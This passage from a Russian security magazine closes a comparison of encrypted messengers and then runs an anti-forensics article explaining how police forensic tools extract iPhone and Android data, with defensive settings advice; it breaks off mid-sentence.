Син хро низация E2EE: есть
Про верка  отпе чатков:  можно  отска ниро вать  QR‐код  собеседника
или ввести его идентификатор
Воз можность добавления устройств: есть, по парольной фразе (как
в кошельках для «битков»)
Групповые E2EE-чаты: нет
Уве домление о про верке E2EE: нет
Защита социального графа: есть
Альтернативные спо собы передачи дан ных: нет


  Еще один мессенджер, осно ванный на блокчейне. Соз дан он в Рос сии
и имеет большую рекламную поддержку, не побо юсь сказать, со всех заин‐
тересованных сторон.





По уверениям разработчиков, его приватность максимальна, непонятно толь‐
ко, по сравнению с чем. При регистрации не нужно вводить никакой пер‐
сональной информации. История сообщений не хранится на устройстве,
а загружается из блокчейна, поэто му доступ к переписке возможен сразу
с нескольких устрой ств пользователя — в этом как раз и заключается
основной смысл тех нологии.
  В мессендже ре также предусмотрена воз можность отправлять собесед‐
никам криптовалюту, а именно ADM, ETH и BNB, причем разработчики обе‐
щают расширить этот список. Правда, акту аль ность этой фичи остается
под вопросом, учитывая резкое падение биткойна, а следом за ним и других
криптовалют.
  При регистрации новому юзеру сра зу присваивается ID мессенджера
и адрес, по которому можно получить криптовалютный перевод, а также
начисляется поощритель ный приз в размере 0,1 ADM.


                                       Офи циальный сайт   CYPHR


Лицен зия: проприетарный
Цен трализация: центра лизо ванный
Ано нимность: зарегистрировать ся можно только по адресу электронной
почты
E2EE: есть (сообщение отправится, только если собеседник будет онлайн)
Син хро низация E2EE: есть
Про верка отпе чатков: нет
Воз можность добавления устройств: есть
Групповые E2EE-чаты: есть. Сообщение отпра вится, только если все
собеседники будут онлайн
Уве домление о про верке E2EE: нет
Защита социального графа: есть
Альтернативные спо собы передачи дан ных: нет


   Этот мессенджер раз рабатывают в компании Golden Frog, и он проп‐
риетарный. Конеч но, его создатели обещают не хра нить на своих серверах
связанные с пользователями метаданные и называют свое приложе ние zero‐
knowledge.





Но все же, несмотря на эти уверения, кое‐что будет храниться на сервере
до того, как адресат получит сообщение. А именно — само сообщение
в зашифрованном виде, время его отправки и имя адре сата, то есть данные,
которые необходимы для успешной переда чи сооб щения. Сообщения шиф‐
руются с помощью 256‐бит ного симметричного шифрования.
  В общем, в Cyphr хорошо практичес ки все, кроме закрытых исходников.


                                       Офи циальный сайт  SILENCE


Лицен зия: GPLv3 (исходники)
Цен трализация: децентра лизованный
Ано нимность: нет, SMS‐сооб щения отправляются на номер телефона
E2EE: есть
Син хро низация E2EE: нет
Про верка отпе чатков: есть
Воз можность добавления устройств: нет, при установке приложения
не создается учетная запись, а идет при вяз ка к телефонному номеру
Групповые E2EE-чаты: нет
Защита социального графа: нет (у оператора останется информация
о факте отправки SMS‐сообщения)
Альтернативные спо собы передачи дан ных: нет


  Мессенджер, отко ловшийся от проекта Signal, который в свое вре мя
вырос из мессенджера TextSecure. Его осо бенность заключается в том, что
шифрует  он  только SMS‐сообщения.  Из‐за  этого  Silence  выделяется
из общего списка рассматриваемых мною мес сенджеров, но тем не менее
он весьма интересен. Silence можно установить на телефон под управлением
Android в качестве основного приложения для отправки и приема SMS‐сооб‐
щений.





Этот мессенджер работает там, где нет доступа к интерне ту или где воз‐
можности его использования огра ничены. Но дос тупен Silence только для An‐
droid, версии для iOS не существует в природе.


   ИТОГИ


В этот раз дела в целом обстоят получше: у всех рассмотренных мессендже‐
ров как минимум есть функция шифрования переписки. Рекомендовать
какой‐то конкретный из них не буду: лучше выбирай то, что тебе ближе
и удобнее. Моя цель более скромная — помочь сориентироваться в мно‐
гообразии мессен джеров.

Для твоего удобства вся информа ция сведена в таблицу. Помни, что бал лы
в ней — не абсолютная оценка защищенности; они говорят лишь о наличии
некоторого числа важных признаков.





В таблице также приведены результаты по мессенджерам из пре дыду щей
статьи.
ПРИВАТНОСТЬ

      АНТИ
КРИМИНАЛИСТИКА

       КАК ЗАЩИТИТЬ СМАРТФОН
       ОТ ИЗВЛЕЧЕНИЯ ДАННЫХ





                                          Олег Афонин
                                             Эксперт по мобильной
                                           криминалистике компании
                                                «Элкомсофт»
                                                aoleg@voicecallcentral.com





Своеобразным  триггером,  вызвавшим  появление  этой
статьи, стало огромное количество публикаций в самых раз‐
нообразных изданиях, в том числе достаточно технических.
Все эти публикации без единого исключения уныло повторя‐
ют одну и ту же мантру: используйте стойкий код блокировки,
включите дат чик отпечатков, отключите Smart Lock, включите
двухфакторную аутентификацию, обновитесь на последнюю
доступную вер сию ОС… Не будем спорить, все эти вещи
проделать  необходимо —  но  совершенно,  абсолютно
недостаточно.


Ты можешь выбрать самый стойкий код блокировки, но если в твоем телефо‐
не используется шифрование FDE и ты не вклю чил режим Secure Startup, то
код блокировки может быть хоть в сот ню символов длиной — шифрование
все равно будет использовать фра зу default_password. Отключение Smart
Lock — необходимый, но недос таточный шаг; уверен ли ты в безопасности
используемой в твоем устройстве технологии ска нирования лица (если
телефон ей оборудован)? А зна ешь ли ты, что, просто зайдя на твой компь‐
ютер, можно извлечь все твои облачные пароли, после чего попросту сбро‐
сить код блокировки смартфона? (Работа ет, к счастью, не для всех устройств ,
но знать о такой возможнос ти нужно.) Наконец, нужно отдавать себе отчет,
что если с твоего компьютера будет получен пароль от облака (Google, Apple
или Samsung), то сам телефон будет никому не нужен: все необходимые дан‐
ные эксперт извле чет из облака (и, ско рее всего, их там будет даже больше,
чем в самом телефоне).
  В этой статье мы не будем давать набивших оскомину советов «включить
код блокировки» или «обновиться до последней версии ОС» (разумеется, ты
это уже сделал). Вместо это го мы пос тараемся дать понимание всего спек‐
тра возможностей «тяжелой артиллерии», которая может быть использована
против владельца телефона пра воохранительными органами и спецслуж‐
бами для извлечения данных.
   Как известно, самые слож ные для работы экспертов случаи — обес точен‐
ный телефон, обнаруженный у безмолвного тела. Именно в таких обстоятель‐
ствах, как правило, начинается поиск всевозможных уязвимостей в програм‐
мном и аппаратном обеспечении. В обыденных ситуациях полиция придет
домой к подозреваемо му, проведет анализ компьютера и извле чет кеш
паролей из почтовых клиентов и бра узеров Chrome/Mozilla/Edge. Затем дос‐
таточно зайти в облако с найденным логином и паролем, после чего осталь‐
ное тривиально. В ряде случаев на телефоне можно удаленно сбросить
пароль блокировки (сегодня, к счастью, многие производители не предлага‐
ют такой возможности по умолчанию). Телефон можно под ключить к «ось‐
миногу» UFED, который скопирует раз дел данных и рас шифру ет его через
одну из известных разработ чикам уязвимос тей или с использованием «рас‐
шифровывающего загрузчика» (decrypting bootloader в терминах Cellebrite)
независимо от длины тво его пароля и наличия установленных обновле ний.
   Прочитав эту статью, ты будешь более полно осоз навать воз можнос ти
защитить свои данные и риски, которые оста нутся даже тогда, когда ты все
сделал правильно.


КАК БУДУТ ВЗЛАМЫВАТЬ ТВОЙ IPHONE
Сложность взлома iPhone отличается в зависимости от ряда факторов. Пер‐
вый фактор: установленная версия iOS (ты ведь не думаешь, что советы
«обновиться на последнюю дос тупную версию» появились на ровном мес‐
те?), сложность кода бло кировки и то, в каком сос тоянии находится устрой‐
ство (о нем — ниже).
   Сначала — о версиях iOS. Если у тебя до сих пор установлена любая вер‐
сия iOS 11, у меня для тебя пло хая новость: для этой ОС доступен как взлом
кода блокировки методом пря мого перебора, так и полное (и очень быстрое)
извлечение информации через физический дос туп. Сложность кода бло‐
кировки и состояние устройства (включено‐выключено,  активирован ли
защитный режим USB restricted mode и так далее) повлияют на скорость
перебора.


Как будут взламывать iPhone с iOS 11
Если телефон был выключен: скорость перебора паролей будет очень мед‐
ленной (одна попытка в десять секунд). Если ты уста новишь код блокировки
из шести цифр, то перебирать его будут вечность.
   Если телефон был вклю чен и ты хотя бы раз разблокировал его после
вклю чения: первые 300 000 паролей будут опро бованы очень быстро; ско‐
рость перебора такова, что четырехзначный код блокировки может быть
взломан в течение получаса в полностью авто матическом режиме. Вывод?
Используй шестизначный пароль.
   Если ты успел воспользоваться режимом SOS (зажав кнопку питания
и кнопку громкости): телефон снова переходит в режим «медленного»
перебора. Шестизначный код блокировки в этом случае отличная защита.
   Наконец, в iOS 11.4.1 появился режим USB restricted mode, позволяющий
защитить устройство от взлома путем перебора паролей. В течение часа пос‐
ле последнего разбло кирования iOS отключит дос туп к USB‐порту, после
чего перебор паролей станет невоз можным. Для того чтобы защита сработа‐
ла, нужно оставить переключатель USB Accessories в положении «вык‐
лючено». Впрочем, в пос леднее время активно циркулируют слухи, что раз‐
работчикам криминалистичес ких комплексов удалось или вот‐вот удастся
обойти и эту защиту. Вывод? Да обновись ты до iOS 12, наконец!


Как будут взламывать iPhone с iOS 12
Ситуация с iOS 12 довольно интересна. Apple удалось закрыть ряд уязвимос‐
тей, которые делали возможным перебор паролей на устрой ствах с iOS 11.
Более того, защитный режим USB restricted mode был усовершенствован:
теперь USB‐порт (а точ нее, возможность переда чи данных через физический
коннектор Lightning) отключается сразу же, как толь ко ты заблокиру ешь экран
устройства. Правда, только в тех случаях, если ты как минимум три дня
не подключал телефон к компьютеру, про водной аудиосис теме или другим
аксессуарам; если же подключал, то будет как рань ше — через час. Кроме
того, USB‐порт теперь отключается и при вызове режима SOS (зажать кнопку
питания и громкости).
  С другой стороны, в iOS 12 присутству ют уязвимости, перекочевавшие
в систему еще из 11‐й версии ОС. В iOS 12 вплоть до версии 12.1.2 не были
закрыты две важные уязвимости, позволяющие через эскалацию при вилегий
получить полный доступ к файловой системе без установки полноценного
джейлбрейка. Соот ветственно, если  в  руки экспертов телефон с iOS
12.1.2 или более старой попадет в разблокированном состоянии, то данные
из него улетят со свистом. В iOS 12.1.3 часть уяз вимостей была закрыта (не
все: GrayKey по‐прежнему способен извлечь образ файловой системы),
но полностью обезопасить устройства от извес тных на сегодняшний день
эксплоитов смогла только iOS 12.1.4, которая вышла буквально на днях.
Вывод? В совете «обновись до последней дос тупной версии прошивки»
все‐таки что‐то есть!
   Итак, как именно будут пытать ся взло мать твой iPhone с iOS 12?
   Самый безопасный для тебя вариант — если в руки эксперта твой телефон
попадет в выключенном состоянии. В этом случае начать перебор не удас‐
тся — по крайней мере до тех пор, пока разработчики не придумают,
как обойти защитный режим USB (к сло ву, пока не придумали).
   Если телефон был включен и разблокирован хотя бы раз после включения
(но заблокирован на момент взло ма), то сделать с ним что‐то полез ное тоже
не получится. Да, можно попытаться подключить его к твоему компьютеру,
чтобы создать резервную копию через iTunes; если не успел акти вироваться
защитный режим USB и если ты хоть раз подклю чал свой iPhone к iTunes, то
попытка может оказать ся успешной. Как защититься? Установи длинный
и сложный пароль на резервную копию.





Да, в iOS 12 (и в iOS 11) этот пароль можно сбро сить — но только с самого
iPhone и только если известен код блокировки. И даже тогда ты можешь
дополнительно защитить пароль от сброса, уста новив пароль Screen Time.





Пароль Screen Time — не панацея. Вооб ще говоря, это «детская» защита,
функция защиты от сбро са пароля на резервную копию в ней вторична. Тем
не менее обойти ее не получится даже перебором: iOS будет увеличивать
задержки до тех пор, пока скорость перебора не упадет до одной попытки
в час (начиная с десятой попытки).


Если заб рали раз бло киро ван ный телефон
В идеальном мире полиции приш лось бы про явить технические навыки
и пользоваться блестящими устройствами, чтобы просто попытаться взло‐
мать твой смартфон. В большинстве же случаев полиция просто попытается
извлечь из твоего смартфона максимум информации в рамках имеющихся
полномочий за минимальное время. Уверенным голосом «попросить» раз‐
блокировать  телефон,  пос ле  чего  унес ти  раз блокированный  телефон
в отдельную комнату — самый типичный случай для (не льсти себе) мелких
правонарушителей. Давай посмотрим, что может сделать iOS для защиты
твоих данных в этом случае.
   Итак, вводная: iPhone разблокирован и передан сотруднику, но код бло‐
кировки ты не сооб щал. (В скобках: и не сообщай, нет у тебя такой обязан‐
ности в случае обычного задержания.) Что будет происходить дальше?
   Во‐первых, сотрудник может прос то вручную прос мотреть интересующие
его разделы в устрой стве. Здесь и пос тинги в соцсетях (уверен, на тебя там
ничего не найдут, но статья за лайки — она довольно гибкая), и перепис ка,
и сообщения SMS/iMessage, и, разумеется, фотографии.
   Будут извлечены данные приложения «Здоровье», из которых можно будет
сделать выводы о том, что именно ты делал в тот или иной момент (в частнос‐
ти, будет видно — двигался ты или сидел на мес те, а если двигал ся — то
не бежал ли). Нам известен не один, не два и даже не десяток случаев, когда
рутинное задержание вдруг превращалось в арест и предъ явле ние обви‐
нения по факту найденной в смартфоне информа ции.
   Как защититься от ана лиза в этом режиме? Никак, только не передавать
полиции разблокированное устройство. Не  отдать телефон совсем ты
не можешь, но вот отказать ся его раз блокировать — пока что еще твое право
(исключения бывают, например при пересечении границы; мы про них
писали). Здесь отметим, что даже на устройстве с раз блокированным экра‐
ном без кода блокиров ки не удас тся ни прос мотреть пароли из «связки клю‐
чей», ни отключить Find My iPhone, ни сбросить пароль от резервной копии
iTunes, если ты его уста новил, ни даже подклю чить телефон к компьюте ру:
для этого теперь тоже нужен код блокировки.
   Во‐вторых, телефон могут подключить к комплексу GrayKey или подобному
(правда, «подобных» на самом деле нет, но мало ли? Вдруг китай ские дуб‐
ликаторы жестких дисков на учатся взламывать iPhone?). В этом случае спасти
может лишь свежая версия iOS: напомним, вплоть до iOS 12.1.3 включитель‐
но нет никакой проб лемы с тем, чтобы извлечь из устройства образ файловой
системы. В iOS 12.1.4 уяз вимость была закрыта. Надол го ли? Пока неизвес‐
тно.
   Наконец, из телефо на могут попытаться извлечь данные в виде резервной
копии. Для этого потребуется как минимум подклю чить телефон к компьюте‐
ру, для чего эксперту понадобится код бло кировки экрана. Можно попытаться
обойти этот момент, используя файл lockdown из твоего компьюте ра. Впро‐
чем, если ты установишь пароль на резервную копию и защитишь его
от сброса при помощи пароля Screen Time, ты можешь полностью обезопа‐
сить себя с этой стороны.
  Вывод? Если ты разблокировал iPhone и на телефоне установлена пос‐
ледняя версия iOS (на сегодня это 12.1.4), сотрудник, скорее все го, будет
вынужден ограничиться «ручным» анализом на экра не самого телефона.


КАК БУДУТ ВЗЛАМЫВАТЬ ТВОЙ СМАРТФОН НА ANDROID
Как и в случае с iPhone, в полиции попытаются зас тавить тебя раз блокиро‐
вать устройство. Если им это удастся и ты передашь в руки полиции разбло‐
кированный телефон, расслабься: дальнейшее от тебя не зависит; ты выдал
все, что было можно. В отличие от iOS, которая пытается хоть как‐нибудь
защитить тебя даже в таких ситуациях, с экра на разблокированного смартфо‐
на следователь получит:
 • разуме ется, доступ ко всему содержимому карты памяти (виртуальной
   и реальной), вклю чая фото и видео;
 • почту, переписку в мессенджерах, тексты SMS;
 • полный список паролей, сохраненных в Chrome (частенько там можно най‐
   ти и пароль от твоего Google Account — кста ти, про верь, так ли это);
 • подробную историю местополо жения. Очень подробную;
 • данные Google Fit. Их можно экспортировать;
 • звонки, контакты.


Взлом кода бло кировки экрана
Мне очень хотелось бы написать подробную статью о том, как и чем можно
взломать заблокированный смартфон на Android, но, боюсь, это невозможно:
на руках  у пользователей тысячи разнооб разных моделей, основанных
на десятках чип сетов в сотнях вариаций. С учетом разнообразия прошивок,
версий самого Android и доступнос ти актуальных патчей безопасности (та
самая проблема фрагментации Android) сложилась ситуация, в которой даже
крупнейший  производитель  кримина листических  продуктов  не  знает,
с какими устройствами работает их комплекс. «Попробуйте подключить» —
стандартный ответ на вопрос, поддержи вает ли комплекс Х смартфон Y.
   К примеру, простой вопрос: можно ли взло мать код блокировки у конкрет‐
ной модели смартфона, а главное — нужно ли это делать или можно обой‐
тись и так? Многочисленные статьи по безопас ности в один голос рекомен‐
дуют устанавливать стойкий код бло кировки, умалчивая о том, что при мерно
для каждого второго смартфона это совершенно бесполез но. Как опре‐
делить, имеет ли смысл заморачиваться со сложным кодом блокировки
или нужно копать в другую сто рону?
   Ответ связан с алго ритмом шифрования, используемого в конкретном
устройстве. Как ты помнишь, все смартфоны, вышедшие с завода с Android
6 и более поздними версиями, обязаны зашифровать пользовательские дан‐
ные к моменту окончания начальной настройки. Однако шиф рование шиф‐
рованию рознь. В большинс тве старых устройств используется так называ‐
емое полнодисковое шифрование Full Disk Encryption (FDE). В режиме FDE
данные на пользовательском разделе зашифрованы посредством device cre‐
dentials — ключа шифрования, который генерируется на основе некоего
аппаратного ключа и фра зы default_password.
   Да, именно так — default_password защищает все твои данные. И что же,
все пропало? Любой желающий может взять и рас шифровать информацию?
Не совсем. Ключ шифрования генерируется внутри Trusted Execution Environ‐
ment (TEE) в момент загрузки устройства; в качес тве исходных данных учас‐
твует уникальный для каждого устройства ключ, который за пределы TEE
не выходит. Если из телефона извлечь чип памяти и скопировать из него
информацию, то расшифровать данные без клю ча из TEE не удастся. Соот‐
ветственно, для расшифровки информа ции пот ребуется не просто вытащить
из телефона дан ные (например, через режим EDL), а еще и взломать TEE
или подменить загрузчик. В принципе, такие «рас шифровывающие загрузчи‐
ки» (decrypting bootloader) существуют, нап ример у Cellebrite для целого ряда
моделей, а иногда и целых семейств моделей, объеди ненных общим чип‐
сетом. Тем не менее для использования этой возможности понадобится спе‐
циальный комплекс, который и извлечет данные.
   Даже если в твоем телефо не использует ся уста ревшая защита FDE, ты
можешь надежно защитить свои данные, активировав режим Secure Startup.
В этом режиме ключ шифрования будет перешифрован данными аппарат‐
ного клю ча и твоего кода блокировки (вместо default_password). Недостаток
у этого метода тоже есть: телефон прос то не загрузится вплоть до момента
ввода кода блокировки; если твой телефон слу чайно перезагрузится, то ты
не сможешь даже ответить на звонок, пока телефон не загрузится до конца.
   Этот недостаток полностью устра нен в новой пофайловой схе ме шиф‐
рования, получив шей название  File Based Encryption (FBE). Устройства,
зашифрованные FBE, используют user credentials (код блокировки) для шиф‐
рования большей части информации, в том числе всех персональных данных.
При этом исполняемые файлы приложений, а также некоторые базы данных,
необходимые для загрузки устройства, будут зашифрованы пос редством de‐
vice credentials (то есть данных исключительно аппаратного ключа). Режима
Secure Startup при использовании FBE нет за ненужностью.
   Для расшифровки данных как устройств с FDE, использующих режим Se‐
cure Startup, так и устройств с FBE необходимо взломать код блокировки.
Конкретные процедуры отличают ся в зависи мос ти от чипсета, но общий
принцип один: подключиться к USB‐порту и запус тить процедуру перебора.
   Разумеется, в телефо нах есть встроенная защита от таких атак. Мы уже
описывали Qualcomm TrustZone, в рамках которой работает Trusted Execution
Environment (TEE). В ней могут запус кать ся только так называемые трас тлеты
(trustlets), своеобразные микроприложения, подписанные ключом, который
проверяется самой TEE. Именно здесь реализова на проверка пасскода
(через сервис GateKeeper). GateKeeper, в свою очередь, на аппаратном уров‐
не ограничивает скорость перебора паролей; быстро перебрать даже код
из четырех цифр не получится, а шесть цифр можно перебирать до бес конеч‐
ности. Именно GateKeeper не даст взломать телефон, когда включен Secure
Startup или если используется шифрование FBE.
   Если есть защита, то будут и попыт ки ее взло мать. В частности, для про‐
цессоров Qualcomm до Snapdragon 821 включительно существует эксплоит,
позволяющий запустить на выполнение собственный трастлет и обойти огра‐
ничение на скорость перебо ра. В реальнос ти же разработчики криминалис‐
тических комплексов относятся к этой уяз вимос ти как к зубной боли: с одной
стороны, уязвимость существует, она мозолит гла за; заказчики ее хотят.
С другой — восполь зовать ся ей очень трудно: для каждого устройства нужно
писать свой код, подбирать смещения, тестировать... Если бы речь шла
об iPhone, количество акту альных чипсетов которого можно перес читать
по пальцам одной руки, — поддержка уяз вимос ти такого уровня была бы
реализована еще вчера. Но сотни модификаций чипсетов, использующихся
в смартфонах с Android (причем каждая модель, для которой нужно запускать
процесс разработки, попадет в руки полиции в единичных экземпля рах),
делают такую разработку экономически нецелесообразной.
   Для флагманских смартфонов на процессорах Qualcomm возможность
вытащить данные через уяз вимости выглядит приб лизительно так:
 • для старых устрой ств (до Snapdragon 821 вклю чительно) с эксплоитами
   иногда можно взломать пас скод, если не установлен Secure Startup (спо‐
   собов обнаружено множес тво);
 • для старых устрой ств с включенным Secure Startup либо с шиф рованием
   FBE скорость перебора огра ничена GateKeeper. Атака на «холодное»
   устройство (после перезагрузки или включения) практичес ки не реали‐
   зуется  за  исключением  единичных  популярных моделей  (проблема
   «неуловимого Джо»);
 • для новых устрой ств (со Snapdragon 835 и новее) недоступны эксплоиты
   EDL, недоступен экс пло ит TEE и даже в редких слу чаях, когда использует‐
   ся шифрование FDE, рас шифро вать содержимое раздела данных доволь‐
   но непросто (но в отдельных случаях можно, экс плоиты существу ют);
 • наконец, для новых устройств (SD835 и новее), использующих шиф‐
   рование FBE, никакие экс плоиты не работа ют: ключ шифрования зависит
   от пароля, а перебор очень медленный (GateKeeper).


Как защитить свой смартфон от взло ма кода бло кировки
и физического извле чения дан ных
Для начала проверь, какая система шифрования используется на твоем
устройстве. Для это го выполни через ADB следующую команду:


$ adb shell getprop ro.crypto.type

Если команда вернула сло во ﬁle, то твой смартфон использует шифрование
FBE.
Если используется пофайловое шифрование FBE:
 • установи код блокировки длиной не менее шести цифр (если позволяет
   устройство);
 • отключи отладочный режим USB Debugging.

Если используется FDE, включи Secure Startup. Для этого:
 • зайди в настрой ки и удали текущий код блокировки;
 • создай новый код блокировки. Сис тема запросит, хочешь ли ты включить
   режим безопасной загрузки. Подтверди запрос;
 • не забудь отключить отла дочный режим USB Debugging.

Можно ли изменить тип шифрования с FDE на FBE? В общем случае — нет.
Возможность перейти с FDE на FBE была лишь у некоторых устройств Google
(например, в планшете Pixel C), когда FBE разрабаты вал ся. Для современных
устройств такой возможности нет.


Об щие рекомен дации
Какие рекомендации обычно дают статьи, пос вященные безопас ности An‐
droid? Использовать код блокировки пос ложнее или паттерн под линнее;
отключить Smart Lock; обновить Android; вклю чить двухфакторную аутен‐
тификацию. Советы звучат логично, но при этом исключительно повер‐
хностно, в стиле «информационная безопасность для блондинок». Между тем
для каждого второго смартфона на Android длина кода блокировки никак
не влияет на безопасность; отклю чение Smart Lock бесполезно, если поль‐
зователь включил (или забыл выключить) отладочный режим USB debugging,
а проверять обновле ния Android нет смысла, если производитель твоего
устройства затягивает с обновлениями.
   Для начала составим свой список рекомендаций, а потом пройдемся
по некоторым пунктам подробно.
 1. Код блокировки. Он нужен, и желательно не короче шести цифр. При этом
   следует проверить, какой механизм шифрования используется в твоем
   смартфоне — FDE или FBE, и если FDE, то необ ходимо включить режим
   безопасной загрузки Secure Startup.
 2. Отключи отладочный режим USB debugging. Любые другие действия бес‐
   смысленны, если этот режим включен.
 3. Наверное, ты в курсе, что разбло кированный загрузчик — дыра в безопас‐
   ности? Не будем даже рассматривать такие слу чаи, но если в нас тройках
   для разработчика (Developer settings) тво его телефона есть пункт OEM un‐
    lock, а ты не собира ешься в бли жайшее время разблокировать заг‐
   рузчик — отключи его.
 4. Если в твоем телефоне есть настройка режима, в котором устройство дол‐
   жно быть доступно при подключении к компь ютеру, выбери «Только заряд‐
   ка» (Charge  only). В противном случае из твоего заблокированного
   телефона удастся скопировать содержимое карты памяти, включая фото
   и видео. Если такой нас тройки нет, то проверь, что происходит при под‐
   клю чении. Как правило, в современных устройствах режим Charge only
   будет выбран по умол чанию. Если это так — все в порядке; если же
   по умолчанию выбран File Transfer или MTP — на безопас ности можно ста‐
   вить крест.
 5. Конечно, последняя версия Android — это хорошо, а актуальные патчи
   безопасности и вовсе вещь обязательная. Проблема лишь в том, что
   подавляющее  большинс тво  производителей  безобразно  затягивает
   с обновлениями, оставляя найденные уязвимости незакрытыми на многие
   месяцы (а то и годы). Если твой телефон не актуальный флагман (или акту‐
   альный флагман Samsung или LG), то о быстрых обновле ниях можно
   забыть. Но обновления все равно проверь.
 6. Smart Lock — абсолют ное зло с точки зрения безопасности. Отключи все
   виды Smart Lock, в том числе раз блокировку по лицу (только в Smart Lock;
   если твой телефон оборудо ван объемным ска нером с инфракрасной под‐
   светкой — совет неактуален).
 7. Заодно отклю чи задержку блокировки телефона, если она настроена (нас‐
   трой Settings → Security & Location → Automatically lock → Immediately).
 8. Про установку из неиз вестных источни ков не забыл? Не стоит держать
   этот переключатель в активном сос тоянии, он действительно делает твой
   телефон уязвимым. Кстати, в Android 8 отдельной настройки нет; раз‐
   решение выдается отдельным приложениям, управлять нас тройкой можно
   через пункт настроек Special app access.
 9. Буквально на днях произошел скандал: оказалось, что ряд при ложений
   для iPhone записывает действия пользователя и передает в виде аналити‐
   ки скриншоты экрана, включая пер сональные данные, номера паспортов
   и кредитных карт. В Android скандала не было: абсолютно любое приложе‐
   ние с разрешениями Draw over other apps или запущенное в виде сервиса
    Accessibility может проделать то же самое. Проверь, нет ли там чего лиш‐
   него.
10. А еще есть такая вещь, как Device admin. Приложения из этой категории
   могут использоваться для того, чтобы дистанци онно сменить код бло‐
   кировки, заблокировать или разбло кировать устройство, сбросить нас‐
   тройки к заводским. Если это Google Find My Phone или Exchange Admin,
   установленный твоим работодателем, то все хорошо. Проверь, чтобы
   в списке не оказалось лишнего.
11. Про встроенные производителями бэкдоры ты, наверное, уже в курсе.
  Многие производители встраивают в прошивки своих телефонов средс тва
   для сбора аналитики. Время от времени оказыва ется, что «аналитика» —
   это и твои контакты с паролями. По большому сче ту, поделать тут особо
   ничего нельзя. Ты можешь попытать ся ограничить доступ аналитики
   в интернет (например, приложением AdGuard, установленным, кстати,
   из сторонних источников — с сайта раз работчика, а не из Play Store),
   но если у тебя на руках такой аппарат, то все воз можные данные уже дав‐
   но утекли. Просто смирись.
12. Наконец, о приложениях из Play Store. Многие из них затребовали (и, ско‐
   рее всего, получили) самые дикие раз решения. Например, «Птичкам» ты
   мог дать доступ к камере, микрофону и контактам (зачем?), продвинутому
   калькулятору — доступ к местоположению, а красивой фотогалерее —
   разрешение на чтение и отправку SMS. Не поленись и зайди в список раз‐
   решений приложений; для большинс тва пользователей простой анализ
   выданных разрешений становится большим сюрпризом.
13. Не храни пароль от Google Account в бра узере Chrome. Его будут искать
   в первую оче редь.
14. Вклю чи двухфакторную аутентифика цию. Без комментариев; на эту тему
  мы писали не раз и не два.



                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
 АНТИКРИМИНАЛИСТИКА
           КАК ЗАЩИТИТЬ СМАРТФОН ОТ ИЗВЛЕЧЕНИЯ
                                    ДАННЫХ





Отложен ная бло кировка
Когда‐то давно ввод кода блокировки был единс твенным, медленным
и неудобным способом разблокировать экран телефона. Многим поль‐
зователям постоянный ввод пароля представлялся неудобным; они отказыва‐
лись от защиты в пользу удобства и скорости. Отло женная блокировка стала
логичной реакцией на проблему со стороны как Google, так и Apple.





При активации соот ветству ющей опции можно было отключить дисплей
телефона кнопкой, включить его снова — и попасть сразу на домашний
экран. Задержку можно нас тра ивать в зависимос ти от собственных пред‐
почтений. Нужно ли говорить, что задержка блокировки катастрофичес ки сни‐
жает уровень безопасности? Представь ситуацию: ты идешь по улице, уткнув‐
шись в телефон, и вдруг упираешь ся в грудь полицейского. Рефлекторно
жмешь кнопку отключения дисплея, пос ле чего тебя задерживают. Телефон
у тебя конфискуют, вклю чают экран — и сра зу же попадают на домашний
экран. Пароли, коды бло кировки, заблокированный загрузчик, шиф рование
и многие другие вещи уже не будут иметь значения.
  В iOS есть аналогичная нас тройка: Settings → Touch ID & Passcode → Re‐
quire Passcode. Ее предназна чение примерно такое же, как в смартфонах
с Android, за одним важным отличием: если ты исполь зуешь Touch ID или Face
ID, в современных версиях iOS единственным дос тупным вари антом выбора
будет Immediately (то есть блокировать сра зу после отключения экрана). А вот
если ты отключишь биометрику, оставив толь ко код блокировки, то станут
доступными и другие варианты вплоть до Never (зап рашивать код блокировки
только после первой заг рузки и время от времени согласно постоянно меня‐
ющимся политикам Apple). Обра ти внимание: некоторые варианты могут быть
недоступны, если на  тво ем устройстве  установлена внешняя политика
безопасности.


Smart Lock
Почему все так опол чились на функцию Smart Lock? Дело в том, что эта фун‐
кция позволяет разблокиро вать телефон, исполь зуя методы, которые не име‐
ют ничего общего с безопасностью. Рас смотрим на при мерах.





Face Unlock. Разблокировка по лицу в разделе Smart Lock не име ет ничего
общего с биометрической аутентифика цией. Это — всего лишь сличение
образа пользователя с фотографией, сделанной на фронтальную камеру
устройства. Такой Face Unlock легко обманывается плоской фотографи ей.
Обрати внимание: в телефо нах, обо рудованных биометрической функцией
Face Unlock (например, Xiaomi Mi 8), этого пункта в настройках не будет;
в таких устройствах Face Unlock подчиняется тем же требованиям и пра‐
вилам, что и разблокировка по дат чику отпечатка паль цев.
   Trusted places. Автоматически раз блокирует устройства в окрес тностях тех
мест, где ты часто бываешь. Если телефон вытащат из твоего кармана возле
дома, у злоумышленника не воз никнет никаких проблем с его раз блокиров‐
кой.
   Trusted  devices. Если подключено доверенное  устройство  Bluetooth,
телефон может быть раз блокирован авто матически. Поверь,  у полиции
не возникнет  затруднений использовать  твои умные часы или  трекер
для такой разблокировки.
   Voice Match, On‐body detection. В какой‐то степени экспе риментальные
варианты, позволяющие пользователям реже разблокировать устройство
кодом блокировки.
   Если Smart Lock настолько небезо пасен, почему он вообще есть в An‐
droid? Smart Lock — тяжкое наследие тех времен, когда ввод кода блокировки
или паттерна был единственным способом раз блокировать телефон. Подав‐
ляющему большинству пользователей не нра вилось, что на разблокировку
устройства тратятся драгоценные секунды (а раз блокировать телефон в пер‐
чатках было той еще задачей); в результате мно гие не устанавливали никакой
защиты вообще. Для того чтобы хоть как‐то приучить пользователей к уста‐
новке кода блокировки, Google пришлось сильно занизить планку: так, появи‐
лись опции, позволяющие отсрочить блокировку экрана на 10–15 минут
с момента последней разблокировки. Smart Lock — из той же опе ры. Никакой
разумной нужды что в Smart Lock, что в отло женной блокировке уже не оста‐
лось: современные сканеры отпечатков пальцев срабаты вают чуть быстрее,
чем просто «мгновенно», а разблокировка по лицу достигла дос таточно
высоких уровней скорости и безопасности.


Раз бло кировка по лицу
Насколько безопасна раз блокировка по лицу? Мы не стали писать об этом
в разделе про iPhone; в них используется система с достаточным уровнем
технической безопасности. В смартфонах с Android производите ли устанав‐
ливают модули разблокировки по лицу, безопасность которых находится
в пределах от «хорошо» до «тот же Smart Lock, вид сбоку». Так, в смартфонах
Samsung есть режим, комбинирующий образ лица со сканированием радуж‐
